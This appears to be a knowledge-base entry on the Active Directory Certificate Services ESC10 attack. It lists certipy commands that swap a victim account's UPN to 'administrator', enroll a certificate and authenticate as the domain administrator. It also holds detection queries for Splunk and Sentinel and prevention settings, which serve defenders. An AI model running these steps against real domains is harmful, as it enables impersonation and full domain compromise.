name: ADCS ESC10 - Weak Certificate Mapping
command:
certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn administrator
certipy req -u <victim>@<domain> -p <pass> -ca <ca_name> -template User
certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn <victim>@<domain>
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
description: ESC10 exploits weak certificate mapping (StrongCertificateBindingEnforcement=0 or CertificateMappingMethods contains UPN mapping). Unlike ESC9, this works with normal templates that DO include the security extension, because the DC is configured to ignore it. Two variants: Case 1 targets user accounts when StrongCertificateBindingEnforcement=0, Case 2 targets machine accounts when CertificateMappingMethods has weak flags.
source: SpecterOps Certified Pre-Owned v2; Certipy docs
notes:
=== CASE 1: StrongCertificateBindingEnforcement = 0 ===
The DC does not check the security extension at all.
Same steps as ESC9 but works with ANY template:
  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn administrator
  certipy req -u <victim>@<domain> -p <pass> -ca <ca_name> -template User
  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn <victim>@<domain>
  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

=== CASE 2: CertificateMappingMethods has UPN bit (0x4) ===
Registry: HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods
If bit 0x4 is set, Schannel maps certs by UPN only.
Same attack flow but targets machine accounts for S4U2Self.

=== CHECK CONFIGURATION ===
  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -stdout | grep -A5 "StrongCertificateBindingEnforcement"

=== DIFFERENCE FROM ESC9 ===
ESC9: Template removes the security extension (CT_FLAG_NO_SECURITY_EXTENSION)
ESC10: DC ignores the security extension (registry misconfiguration)

examples.label: ESC10 Case 1 - exploit weak binding
examples.command: certipy account update -u jdoe@corp.local -p Password123 -user victim -upn administrator

examples.label: Request cert and authenticate
examples.command: certipy req -u victim@corp.local -p Password123 -ca corp-CA -template User -dc-ip 192.168.1.10

references.title: MITRE T1649 - Steal or Forge Authentication Certificates

recommended.note: ESC9 targets the template flag; ESC10 targets the DC registry.

defense.why_it_works: When StrongCertificateBindingEnforcement=0, the DC does not verify the security extension SID mapping, allowing certificate impersonation through UPN manipulation.
defense.prerequisites: GenericWrite on another account; StrongCertificateBindingEnforcement=0 or weak CertificateMappingMethods.
defense.impact: Domain admin compromise via certificate-based impersonation of any user.
defense.detection: [MITRE T1649] Same UPN change pattern as ESC9; check registry for weak StrongCertificateBindingEnforcement.
defense.artifacts: Event 4738 (UPN change); Event 4886/4887 (cert enrollment); registry audit events.
defense.splunk_spl:
index=windows EventCode=4738
| where isnotnull(UserPrincipalName)
| table _time, SubjectUserName, TargetUserName, UserPrincipalName
defense.sentinel_kql:
SecurityEvent
| where EventID == 4738 and UserPrincipalName != ""
| project TimeGenerated, SubjectUserName, TargetUserName, UserPrincipalName
defense.prevention: Set StrongCertificateBindingEnforcement to 2 (Full Enforcement); ensure CertificateMappingMethods does not include UPN-only mapping (0x4).

detections.name: ESC10 - UPN modification for certificate abuse
detections.logic:
index=windows EventCode=4738
| where isnotnull(UserPrincipalName)
| eval suspicious=if(like(UserPrincipalName,"admin%") OR like(UserPrincipalName,"domain admin%"),1,0)
| where suspicious=1
| table _time, SubjectUserName, TargetUserName, UserPrincipalName
detections.tuning: Alert on any UPN change to known privileged account names
